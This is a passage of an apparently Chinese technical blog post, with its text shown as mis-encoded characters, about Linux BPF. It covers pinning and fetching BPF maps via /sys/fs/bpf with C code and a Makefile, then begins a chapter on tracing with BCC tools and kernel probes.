class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">CLANG = clang</span><br><span class="line"></span><br><span class="line">INCLUDE_PATH += -I/root/linux-5.4/tools/lib/bpf</span><br><span class="line"></span><br><span class="line">LIBRARY_PATH = -L/usr/local/lib64</span><br><span class="line">BPFSO = -lbpf</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>: clean </span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">rm -f fetch save</span><br><span class="line"></span><br><span class="line"><span class="section">fetch: map_pinning_fetch.c </span></span><br><span class="line">clang -o fetch -lelf <span class="variable">$(INCLUDE_PATH)</span> <span class="variable">$(LIBRARY_PATH)</span> <span class="variable">$(BPFSO)</span> <span class="variable">$?</span></span><br><span class="line"></span><br><span class="line"><span class="section">save: map_pinning_save.c</span></span><br><span class="line">clang -o save -lelf <span class="variable">$(INCLUDE_PATH)</span> <span class="variable">$(LIBRARY_PATH)</span> <span class="variable">$(BPFSO)</span> <span class="variable">$?</span></span><br><span class="line"></span><br><span class="line"><span class="section">build: fetch save</span></span><br><span class="line"></span><br><span class="line">.DEFAULT_GOAL := build</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç¨‹åºå‰æŸ¥çœ‹<code>/sys/fs/bpf</code>è·¯å¾„ä¸‹çš„ç›®å½•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt2]# ls -la /sys/fs/bpf/</span><br><span class="line">total 0</span><br><span class="line">drwx-----T 2 root root 0 May 16 20:00 .</span><br><span class="line">drwxr-xr-x 6 root root 0 May 16 20:00 ..</span><br></pre></td></tr></table></figure><p>å¼€å§‹æ‰§è¡Œè¯¥ç¨‹åº</p><p>ç¬¬ä¸€æ­¥æ‰§è¡Œ<code>make save</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt2]# make save</span><br><span class="line">clang -o save -lelf -I/root/linux-5.4/tools/lib/bpf -L/usr/local/lib64 -lbpf map_pinning_save.c</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒæ­¥æ‰§è¡Œç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt2]# ./save</span><br></pre></td></tr></table></figure><p>åœ¨ç¨‹åºæ‰§è¡Œç»“æŸåï¼Œå†æ¬¡æ£€æŸ¥è¯¥è·¯å¾„ä¸‹æ˜¯å¦æœ‰ä¸€ä¸ªæ–°æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt2]# ls -la /sys/fs/bpf/</span><br><span class="line">total 0</span><br><span class="line">drwx-----T 2 root root 0 May 25 16:15 .</span><br><span class="line">drwxr-xr-x 6 root root 0 May 16 20:00 ..</span><br><span class="line">-rw------- 1 root root 0 May 25 16:15 my_array</span><br></pre></td></tr></table></figure><p>æ¥ç€æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªç±»ä¼¼çš„ç¨‹åºï¼Œä»æ–‡ä»¶ç³»ç»ŸåŠ è½½è¯¥æ˜ å°„å¹¶æ‰“å°æˆ‘ä»¬æ’å…¥çš„å…ƒç´ ã€‚ è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥éªŒè¯æ˜¯å¦æ­£ç¡®ä¿å­˜äº†æ˜ å°„ï¼š</p><p><code>map_pinning_fetch.c</code>ç¨‹åºå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"bpf.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *file_path = <span class="string">"/sys/fs/bpf/my_array"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd, key, value, result;</span><br><span class="line"></span><br><span class="line">  fd = bpf_obj_get(file_path);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to fetch the map: %d (%s)\n"</span>, fd, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  key = <span class="number">1</span>;</span><br><span class="line">  result = bpf_map_lookup_elem(fd, &amp;key, &amp;value);</span><br><span class="line">  <span class="keyword">if</span> (result &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to read value from the map: %d (%s)\n"</span>, result,</span><br><span class="line">           strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å¹¶æ‰§è¡Œï¼Œç»“æœå¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt2]# make fetch</span><br><span class="line">clang -o fetch -lelf -I/root/linux-5.4/tools/lib/bpf -L/usr/local/lib64 -lbpf map_pinning_fetch.c</span><br><span class="line">[root@VM-16-14-centos cpt2]# ./fetch </span><br><span class="line">Value read from the map: '1234'</span><br></pre></td></tr></table></figure><p>å°†BPFå¯¹è±¡ä¿å­˜åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ä½¿å¾—æ•°æ®å’Œç¨‹åºä¸å†ä¾èµ–äºå•ä¸ªæ‰§è¡Œçº¿ç¨‹ã€‚ä¿¡æ¯å¯ä»¥ç”±ä¸åŒçš„åº”ç”¨ç¨‹åºå…±äº«ï¼ŒBPFç¨‹åºç”šè‡³å¯ä»¥åœ¨åˆ›å»ºå®ƒä»¬çš„åº”ç”¨ç¨‹åºç»ˆæ­¢åè¿è¡Œã€‚è¿™ä¸ºå®ƒä»¬æä¾›äº†é¢å¤–çš„çº§åˆ«æˆ–å¯ç”¨æ€§ï¼Œå¦‚æœæ²¡æœ‰BPFæ–‡ä»¶ç³»ç»Ÿï¼Œå®Œæˆè¿™äº›æ“ä½œæ˜¯ä¸å¯èƒ½çš„ã€‚</p><h3 id="ç»“è®º-1"><a href="#ç»“è®º-1" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h3><p>åœ¨å†…æ ¸å’Œç”¨æˆ·ç©ºé—´ä¹‹é—´å»ºç«‹é€šä¿¡é€šé“æ˜¯å……åˆ†åˆ©ç”¨BPFç¨‹åºçš„åŸºç¡€ã€‚ åœ¨æœ¬ç« ä¸­ï¼Œæˆ‘ä»¬å­¦ä¹ äº†å¦‚ä½•åˆ›å»ºBPFæ˜ å°„æ¥å»ºç«‹è¿™ç§é€šä¿¡ä»¥åŠå¦‚ä½•ä½¿ç”¨å®ƒä»¬ã€‚æˆ‘ä»¬è¿˜æè¿°äº†å¯ä»¥åœ¨ç¨‹åºä¸­ä½¿ç”¨çš„æ˜ å°„ç±»å‹ã€‚ æ¥ç€æˆ‘ä»¬å­¦ä¹ åˆ°äº†æ›´å…·ä½“çš„æ˜ å°„ç¤ºä¾‹ã€‚æœ€åæˆ‘ä»¬å­¦ä¹ äº†å¦‚ä½•å°†æ•´ä¸ªæ˜ å°„å›ºå®šåˆ°ç³»ç»Ÿä¸­ï¼Œä»¥ä½¿å¾—å®ƒä»¬æ‰€ä¿å­˜çš„ä¿¡æ¯èƒ½å¤Ÿç»å—ä½å´©æºƒå’Œä¸­æ–­çš„å½±å“ã€‚</p><p>BPFæ˜ å°„æ˜¯å†…æ ¸å’Œç”¨æˆ·ç©ºé—´ä¹‹é—´é€šä¿¡çš„ä¸­å¿ƒæ€»çº¿ã€‚åœ¨æœ¬ç« ä¸­ï¼Œæˆ‘ä»¬å»ºç«‹äº†ç†è§£å®ƒä»¬æ‰€éœ€çš„åŸºæœ¬æ¦‚å¿µã€‚åœ¨ä¸‹ä¸€ç« ä¸­ï¼Œæˆ‘ä»¬å°†æ›´å¹¿æ³›åœ°ä½¿ç”¨è¿™äº›æ•°æ®ç»“æ„æ¥å…±äº«æ•°æ®ã€‚æˆ‘ä»¬è¿˜ä¼šä»‹ç»ä¸€äº›å…¶ä»–å·¥å…·ï¼Œè¿™äº›å·¥å…·å°†ä½¿BPFæ˜ å°„çš„ä½¿ç”¨æ›´åŠ é«˜æ•ˆã€‚</p><p>åœ¨ä¸‹ä¸€ç« ä¸­å°†çœ‹åˆ°BPFç¨‹åºå’Œæ˜ å°„å¦‚ä½•ååŒå·¥ä½œï¼Œä»å†…æ ¸çš„è§’åº¦ä¸ºä½ æä¾›ç³»ç»Ÿä¸Šçš„è·Ÿè¸ªåŠŸèƒ½ã€‚ æˆ‘ä»¬æ¢ç´¢äº†å°†ç¨‹åºé™„åŠ åˆ°å†…æ ¸ä¸­ä¸åŒå…¥å£ç‚¹çš„ä¸åŒæ–¹æ³•ã€‚æœ€åï¼Œæˆ‘ä»¬å°†ä»‹ç»å¦‚ä½•ä»¥ä¸€ç§ä½¿åº”ç”¨ç¨‹åºæ›´æ˜“äºè°ƒè¯•å’Œè§‚å¯Ÿçš„æ–¹å¼è¡¨ç¤ºå¤šä¸ªæ•°æ®ç‚¹ã€‚</p><h2 id="ç¬¬å››ç« èŠ‚"><a href="#ç¬¬å››ç« èŠ‚" class="headerlink" title="ç¬¬å››ç« èŠ‚"></a>ç¬¬å››ç« èŠ‚</h2><h3 id="ä½¿ç”¨-BPF-è¿›è¡Œè·Ÿè¸ª"><a href="#ä½¿ç”¨-BPF-è¿›è¡Œè·Ÿè¸ª" class="headerlink" title="ä½¿ç”¨ BPF è¿›è¡Œè·Ÿè¸ª"></a>ä½¿ç”¨ BPF è¿›è¡Œè·Ÿè¸ª</h3><p>åœ¨è½¯ä»¶å·¥ç¨‹é¢†åŸŸï¼Œè·Ÿè¸ªæ˜¯ä¸€ç§é€šè¿‡æ”¶é›†æ•°æ®è¿›è¡Œåˆ†æå’Œè°ƒè¯•çš„æ–¹æ³•ã€‚ç›®æ ‡æ˜¯åœ¨è¿è¡Œæ—¶æä¾›æœ‰ç”¨çš„ä¿¡æ¯ä»¥ä¾›å°†æ¥åˆ†æã€‚ä½¿ç”¨BPFè¿›è¡Œè·Ÿè¸ªçš„ä¸»è¦ä¼˜ç‚¹æ˜¯å¯ä»¥è®¿é—®æ¥è‡ªLinuxå†…æ ¸å’Œåº”ç”¨ç¨‹åºçš„ä»»ä½•ä¿¡æ¯ã€‚ä¸å…¶ä»–è·Ÿè¸ªæŠ€æœ¯ç›¸æ¯”ï¼ŒBPFå‡å°‘äº†ç³»ç»Ÿæ€§èƒ½å’Œå»¶è¿Ÿï¼Œå¹¶ä¸”ä¸éœ€è¦å¼€å‘äººå‘˜ä¸ºäº†ä»åº”ç”¨ç¨‹åºæ”¶é›†æ•°æ®è€Œä¿®æ”¹ä»–ä»¬çš„åº”ç”¨ç¨‹åºã€‚</p><p>Linuxå†…æ ¸æä¾›äº†å¤šç§å¯ä¸BPFç»“åˆä½¿ç”¨çš„æ£€æµ‹åŠŸèƒ½ã€‚åœ¨æœ¬ç« æˆ‘ä»¬å°†è®¨è®ºè¿™äº›ä¸åŒçš„åŠŸèƒ½ã€‚æˆ‘ä»¬å°†å±•ç¤ºå†…æ ¸å¦‚ä½•åœ¨æ“ä½œç³»ç»Ÿä¸­æš´éœ²è¿™äº›åŠŸèƒ½ï¼Œä»¥ä¾¿ä½ çŸ¥é“å¦‚ä½•æ‰¾åˆ°å¯ç”¨äºBPFç¨‹åºçš„ä¿¡æ¯ã€‚</p><p>è·Ÿè¸ªçš„æœ€ç»ˆç›®æ ‡æ˜¯é€šè¿‡è·å–æ‰€æœ‰å¯ç”¨æ•°æ®å¹¶ä»¥æœ‰ç”¨çš„æ–¹å¼å‘ˆç°ï¼Œä»è€Œè®©ä½ æ›´åŠ æ·±å…¥çš„äº†è§£ç³»ç»Ÿã€‚ æˆ‘ä»¬å°†è®¨è®ºå‡ ç§ä¸åŒçš„æ•°æ®è¡¨ç¤ºä»¥åŠå¦‚ä½•åœ¨ä¸åŒçš„åœºæ™¯ä¸­ä½¿ç”¨å®ƒä»¬ã€‚</p><p>ä»æœ¬ç« å¼€å§‹ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä¸€ç§å¼ºå¤§çš„å·¥å…·åŒ…æ¥ç¼–å†™BPFç¨‹åºï¼ŒBPFç¼–è¯‘æ”¶é›†å™¨(BCC)ã€‚BCC æ˜¯ä¸€ç»„ä½¿æ„å»ºBPFç¨‹åºæ›´å¯é¢„æµ‹çš„ç»„ä»¶ã€‚å³ä½¿ä½ æŒæ¡äº†<code>Clang</code>å’Œ<code>LLVM</code>ï¼Œä½ ä¹Ÿä¸æƒ³èŠ±è´¹ä¸å¿…è¦çš„æ—¶é—´æ¥æ„å»ºç›¸åŒçš„å®ç”¨ç¨‹åºï¼Œé™¤æ­¤ä¹‹å¤–è¿˜è¦ç¡®ä¿BPFéªŒè¯å™¨ä¸ä¼šæ‹’ç»ä½ ç¼–å†™çš„ç¨‹åºã€‚BCCä¸ºå¸¸è§ç»“æ„ï¼ˆå¦‚<code>Perf</code>äº‹ä»¶æ˜ å°„ï¼‰æä¾›å¯é‡ç”¨ç»„ä»¶ï¼Œå¹¶ä¸<code>LLVM</code>åç«¯é›†æˆä»¥æä¾›æ›´å¥½çš„è°ƒè¯•é€‰é¡¹ã€‚æœ€é‡è¦çš„æ˜¯ï¼ŒBCCåŒ…æ‹¬å¤šç§ç¼–ç¨‹è¯­è¨€çš„ç»‘å®šï¼Œ æˆ‘ä»¬å°†åœ¨ç¤ºä¾‹ä¸­ä½¿ç”¨<code>Python</code>ã€‚ è¿™äº›ç»‘å®šå…è®¸ä½ ç”¨é«˜çº§è¯­è¨€ç¼–å†™BPFç¨‹åºçš„ç”¨æˆ·ç©ºé—´éƒ¨åˆ†ï¼Œä»è€Œäº§ç”Ÿæ›´æœ‰ç”¨çš„ç¨‹åºã€‚æˆ‘ä»¬è¿˜åœ¨åé¢çš„ç« èŠ‚ä¸­ä½¿ç”¨BCCæ¥ä½¿ç¤ºä¾‹ä»£ç æ›´åŠ ç®€æ´ã€‚</p><p>BCCå·¥å…·å®‰è£…</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install bcc-tools</span><br></pre></td></tr></table></figure><p>BCCå·¥å…·å®‰è£…åœ¨<code>/usr/share/bcc/tools/</code>ç›®å½•ä¸­ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# ll /usr/share/bcc/tools/</span><br><span class="line">total 1012</span><br><span class="line">-rwxr-xr-x 1 root root 34678 Jul 16  2021 argdist</span><br><span class="line">-rwxr-xr-x 1 root root  2413 Jul 16  2021 bashreadline</span><br><span class="line">-rwxr-xr-x 1 root root 16209 Jul 16  2021 bindsnoop</span><br><span class="line">-rwxr-xr-x 1 root root  6774 Jul 16  2021 biolatency</span><br><span class="line">-rwxr-xr-x 1 root root  9979 Jul 16  2021 biolatpcts</span><br><span class="line">-rwxr-xr-x 1 root root  5776 Jul 16  2021 biosnoop</span><br><span class="line">-rwxr-xr-x 1 root root  6687 Jul 16  2021 biotop</span><br><span class="line">-rwxr-xr-x 1 root root  1170 Jul 16  2021 bitesize</span><br><span class="line">-rwxr-xr-x 1 root root  2612 Jul 16  2021 bpflist</span><br><span class="line">-rwxr-xr-x 1 root root  4728 Jul 16  2021 cachestat</span><br><span class="line">-rwxr-xr-x 1 root root  7312 Jul 16  2021 cachetop</span><br><span class="line">-rwxr-xr-x 1 root root  8436 Jul 16  2021 capable</span><br><span class="line">-rwxr-xr-x 1 root root    57 Jul 16  2021 cobjnew</span><br><span class="line">-rwxr-xr-x 1 root root 11181 Jul 16  2021 compactsnoop</span><br><span class="line">-rwxr-xr-x 1 root root  5272 Jul 16  2021 cpudist</span><br><span class="line">-rwxr-xr-x 1 root root 14608 Jul 16  2021 cpuunclaimed</span><br><span class="line">-rwxr-xr-x 1 root root  7402 Jul 16  2021 dbslower</span><br><span class="line">-rwxr-xr-x 1 root root  3794 Jul 16  2021 dbstat</span><br><span class="line">-rwxr-xr-x 1 root root  3963 Jul 16  2021 dcsnoop</span><br><span class="line">-rwxr-xr-x 1 root root  3931 Jul 16  2021 dcstat</span><br><span class="line">-rwxr-xr-x 1 root root 19972 Jul 16  2021 deadlock</span><br></pre></td></tr></table></figure><p>èƒ½å¤Ÿåœ¨Linuxå†…æ ¸ä¸­è·Ÿè¸ªç¨‹åºçš„ç¬¬ä¸€æ­¥æ˜¯ç¡®å®šå®ƒä¸ºä½ æä¾›çš„é™„åŠ BPFç¨‹åºçš„æ‰©å±•ç‚¹ã€‚è¿™äº›æ‰©å±•ç‚¹é€šå¸¸ç§°ä¸ºæ¢é’ˆ(probes)ã€‚</p><h4 id="æ¢é’ˆ"><a href="#æ¢é’ˆ" class="headerlink" title="æ¢é’ˆ"></a>æ¢é’ˆ</h4><p>è‹±è¯­è¯å…¸ä¸­å¯¹æ¢é’ˆä¸€è¯çš„å®šä¹‰ä¹‹ä¸€å¦‚ä¸‹ï¼š</p><p>ä¸€ç§æ— äººæ¢ç´¢èˆªå¤©å™¨ï¼Œæ—¨åœ¨ä¼ è¾“æœ‰å…³å…¶ç¯å¢ƒçš„ä¿¡æ¯ã€‚</p><p>è¿™ä¸ªå®šä¹‰åœ¨æˆ‘ä»¬è„‘æµ·ä¸­å”¤èµ·äº†å¯¹ç§‘å¹»ç”µå½±å’Œå²è¯—èˆ¬çš„NASAä»»åŠ¡çš„å›å¿†ã€‚ å½“æˆ‘ä»¬è°ˆè®ºè·Ÿè¸ªæ¢é’ˆæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨éå¸¸ç›¸ä¼¼çš„å®šä¹‰ã€‚</p><p>è·Ÿè¸ªæ¢é’ˆæ˜¯æ¢ç´¢æ€§ç¨‹åºï¼Œæ—¨åœ¨ä¼ è¾“æœ‰å…³æ‰§è¡Œå®ƒä»¬çš„ç¯å¢ƒçš„ä¿¡æ¯ã€‚</p><p>ä»–ä»¬åœ¨ä½ çš„ç³»ç»Ÿä¸­æ”¶é›†æ•°æ®ï¼Œä¾›ä½ æ¢ç´¢å’Œåˆ†æã€‚ä¼ ç»Ÿä¸Šï¼Œåœ¨Linuxä¸­ä½¿ç”¨æ¢é’ˆæ¶‰åŠç¼–å†™ç¼–è¯‘åˆ°å†…æ ¸æ¨¡å—ä¸­çš„ç¨‹åºï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´ç”Ÿäº§ç³»ç»Ÿä¸­çš„ç¾éš¾æ€§é—®é¢˜ã€‚å¤šå¹´æ¥ï¼Œå®ƒä»¬å‘å±•åˆ°æ‰§è¡Œèµ·æ¥å¾ˆå®‰å…¨ï¼Œä½†ç¼–å†™å’Œæµ‹è¯•ä»ç„¶å¾ˆéº»çƒ¦ã€‚åƒ<code>SystemTap</code>è¿™æ ·çš„å·¥å…·å»ºç«‹äº†æ–°çš„åè®®æ¥ç¼–å†™æ¢é’ˆã€‚</p><p>BPFæ­è½½è·Ÿè¸ªæ¢æµ‹æ¥æ”¶é›†ä¿¡æ¯ä»¥è¿›è¡Œè°ƒè¯•å’Œåˆ†æã€‚BPFç¨‹åºçš„å®‰å…¨æ€§ä½¿å¾—å®ƒä»¬æ¯”ä¾èµ–é‡æ–°ç¼–è¯‘å†…æ ¸çš„å·¥å…·æ›´æœ‰å¸å¼•åŠ›ã€‚é‡æ–°ç¼–è¯‘å†…æ ¸ä»¥åŒ…å«å¤–éƒ¨æ¨¡å—å¯èƒ½ä¼šå¼•èµ·ç”±äºä»£ç è¡Œä¸ºä¸å½“è€Œå¯¼è‡´å´©æºƒçš„é£é™©ã€‚BPFéªŒè¯å™¨é€šè¿‡åœ¨åŠ è½½åˆ°å†…æ ¸ä¹‹å‰åˆ†æç¨‹åºæ¥æ¶ˆé™¤è¿™ç§é£é™©ã€‚BPFå¼€å‘äººå‘˜åˆ©ç”¨æ¢é’ˆå®šä¹‰å¹¶ä¿®æ”¹å†…æ ¸ï¼Œä»è€Œå½“ä»£ç æ‰§è¡Œæ‰¾åˆ°å…¶ä¸­ä¸€ä¸ªå®šä¹‰æ—¶æ‰§è¡Œçš„æ˜¯BPFç¨‹åºè€Œä¸æ˜¯å†…æ ¸æ¨¡å—ã€‚</p><p>äº†è§£å¯ä»¥å®šä¹‰çš„ä¸åŒç±»å‹çš„æ¢é’ˆå¯¹äºæ¢ç´¢ç³»ç»Ÿä¸­å‘ç”Ÿçš„äº‹æƒ…è‡³å…³é‡è¦ã€‚åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å¯¹ä¸åŒçš„æ¢é’ˆå®šä¹‰è¿›è¡Œåˆ†ç±»ï¼Œå¦‚ä½•åœ¨ç³»ç»Ÿä¸­å‘ç°å®ƒä»¬ï¼Œä»¥åŠå¦‚ä½•å°†BPFç¨‹åºé™„ç€åˆ°å®ƒä»¬ã€‚</p><p>åœ¨æœ¬ç« ä¸­ï¼Œæˆ‘ä»¬ä»‹ç»äº†å››ç§ä¸åŒç±»å‹çš„æ¢é’ˆï¼š</p><ul><li><p>Kernel probes</p><p>è¿™äº›ä½¿æ‚¨å¯ä»¥åŠ¨æ€è®¿é—®å†…æ ¸ä¸­çš„å†…éƒ¨ç»„ä»¶</p></li><li><p>Tracepoints</p><p>è¿™äº›æä¾›å¯¹å†…æ ¸å†…éƒ¨ç»„ä»¶çš„é™æ€è®¿é—®</p></li><li><p>User-space probes</p><p>è¿™äº›ä½¿æ‚¨å¯ä»¥åŠ¨æ€è®¿é—®åœ¨ç”¨æˆ·ç©ºé—´ä¸­è¿è¡Œçš„ç¨‹åº</p></li><li><p>User statically defined tracepoints</p><p>è¿™äº›å…è®¸é™æ€è®¿é—®åœ¨ç”¨æˆ·ç©ºé—´ä¸­è¿è¡Œçš„ç¨‹åº</p></li></ul><p>æ¥ä¸‹æ¥è®©æˆ‘ä»¬ä»å†…æ ¸æ¢é’ˆå¼€å§‹è¯¦ç»†çš„å­¦ä¹ </p><h3 id="Kernel-probes"><a href="#Kernel-probes" class="headerlink" title="Kernel probes"></a>Kernel probes</h3><p>å†…æ ¸æ¢é’ˆå…è®¸ä½ åœ¨å‡ ä¹ä»»ä½•å†…æ ¸æŒ‡ä»¤ä¸­ä»¥æœ€å°çš„å¼€é”€è®¾ç½®åŠ¨æ€æ ‡å¿—æˆ–ä¸­æ–­ã€‚å½“å†…æ ¸åˆ°è¾¾è¿™äº›æ ‡å¿—ä¹‹ä¸€æ—¶ï¼Œå®ƒä¼šæ‰§è¡Œé™„åŠ åˆ°æ¢é’ˆçš„ä»£ç ï¼Œç„¶åæ¢å¤å…¶æ­£å¸¸ä¾‹ç¨‹ã€‚å†…æ ¸æ¢é’ˆå¯ä»¥ä¸ºä½ æä¾›æœ‰å…³ç³»ç»Ÿä¸­å‘ç”Ÿçš„ä»»ä½•äº‹æƒ…çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ç³»ç»Ÿä¸­æ‰“å¼€çš„æ–‡ä»¶å’Œæ­£åœ¨æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚å…³äºå†…æ ¸æ¢é’ˆéœ€è¦è®°ä½çš„é‡è¦ä¸€ç‚¹æ˜¯å®ƒä»¬æ²¡æœ‰ç¨³å®šçš„åº”ç”¨ç¨‹åºäºŒè¿›åˆ¶æ¥å£ (ABI)ï¼Œè¿™æ„å‘³ç€å®ƒä»¬å¯èƒ½ä¼šåœ¨å†…æ ¸ç‰ˆæœ¬ä¹‹é—´å‘ç”Ÿå˜åŒ–ã€‚å¦‚æœä½ å°è¯•å°†ç›¸åŒçš„æ¢æµ‹å™¨é™„åŠ åˆ°å…·æœ‰ä¸¤ä¸ªä¸åŒå†…æ ¸ç‰ˆæœ¬çš„ä¸¤ä¸ªç³»ç»Ÿï¼Œåˆ™ç›¸åŒçš„ä»£ç å¯èƒ½ä¼šåœæ­¢å·¥ä½œã€‚</p><p>å†…æ ¸æ¢é’ˆåˆ†ä¸ºä¸¤ç±»ï¼š<code>kprobes</code>å’Œ<code>kretprobes</code>ã€‚ å®ƒä»¬çš„ä½¿ç”¨å–å†³äºä½ åœ¨æ‰§è¡Œå‘¨æœŸä¸­æ’å…¥BPFç¨‹åºçš„ä½ç½®ã€‚ æœ¬èŠ‚å°†æŒ‡å¯¼ä½ å¦‚ä½•ä½¿ç”¨å®ƒä»¬ä¸­çš„æ¯ä¸€ä¸ªå°†BPFç¨‹åºé™„åŠ åˆ°è¿™äº›æ¢é’ˆå¹¶ä»å†…æ ¸ä¸­æå–ä¿¡æ¯ã€‚</p><h4 id="Kprobes"><a href="#Kprobes" class="headerlink" title="Kprobes"></a>Kprobes</h4><p><code>Kprobes</code>å…è®¸ä½ åœ¨æ‰§è¡Œä»»ä½•å†…æ ¸æŒ‡ä»¤ä¹‹å‰æ’å…¥BPFç¨‹åºã€‚ä½ éœ€è¦çŸ¥é“ä½ æƒ³è¦ç ´è§£çš„å‡½æ•°ç­¾åï¼Œæ­£å¦‚æˆ‘ä»¬ä¹‹å‰æåˆ°çš„ï¼Œè¿™ä¸æ˜¯ä¸€ä¸ªç¨³å®šçš„ABIï¼Œæ‰€ä»¥å¦‚æœä½ è¦è¿è¡Œç›¸åŒçš„ç¨‹åºï¼Œä½ éœ€è¦åœ¨ä¸åŒçš„å†…æ ¸ç‰ˆæœ¬ä¸­å°å¿ƒè®¾ç½®è¿™äº›æ¢é’ˆã€‚ å½“å†…æ ¸æ‰§è¡Œåˆ°è¾¾ä½ è®¾ç½®æ¢é’ˆçš„æŒ‡ä»¤æ—¶ï¼Œå®ƒä¼šé¿å¼€ä½ çš„ä»£ç ï¼Œè¿è¡Œä½ çš„BPFç¨‹åºï¼Œå¹¶å°†æ‰§è¡Œè¿”å›åˆ°åŸå§‹æŒ‡ä»¤ã€‚</p><p>ä¸ºäº†å±•ç¤ºå¦‚ä½•ä½¿ç”¨<code>kprobes</code>ï¼Œæˆ‘ä»¬å°†ç¼–å†™ä¸€ä¸ªBPFç¨‹åºï¼Œè¯¥ç¨‹åºæ‰“å°ç³»ç»Ÿä¸­æ‰§è¡Œçš„ä»»ä½•äºŒè¿›åˆ¶æ–‡ä»¶çš„åç§°ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†ä¸ºBCCå·¥å…·ä½¿ç”¨Pythonå‰ç«¯ï¼Œä½†ä½ å¯ä»¥ä½¿ç”¨ä»»ä½•å…¶ä»–BPFå·¥å…·ç¼–å†™å®ƒï¼š</p><p><code>kprobes.py</code>ä»£ç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 